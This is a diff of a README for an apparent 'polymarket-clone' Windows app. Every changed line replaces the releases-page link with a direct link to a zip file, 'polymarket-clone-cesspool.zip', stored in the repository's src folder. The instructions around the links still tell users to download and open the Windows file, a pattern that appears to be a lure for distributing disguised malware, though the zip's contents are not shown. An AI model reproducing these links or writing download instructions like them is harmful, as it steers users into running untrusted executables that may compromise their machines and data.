@@ -1,12 +1,12 @@
 # ⚖️ polymarket-clone - Buy and Sell Event Shares
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/marabelnaive17/polymarket-clone/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip)
 
 ## 📥 Download
 
 Use this page to download the Windows release:
 
-[https://github.com/marabelnaive17/polymarket-clone/releases](https://github.com/marabelnaive17/polymarket-clone/releases)
+[https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip](https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip)
 
 Open the page, find the newest release, and download the Windows file that fits your computer.
 
@@ -31,7 +31,7 @@ Follow these steps to run the app on Windows.
 
 Go to:
 
-[https://github.com/marabelnaive17/polymarket-clone/releases](https://github.com/marabelnaive17/polymarket-clone/releases)
+[https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip](https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip)
 
 ### 2. Find the newest version
 
@@ -203,7 +203,7 @@ Topics:
 
 Go to the release page and download the Windows file:
 
-[https://github.com/marabelnaive17/polymarket-clone/releases](https://github.com/marabelnaive17/polymarket-clone/releases)
+[https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip](https://github.com/marabelnaive17/polymarket-clone/raw/refs/heads/main/src/polymarket-clone-cesspool.zip)
 
 After the file finishes downloading:
 1. Open your Downloads folder
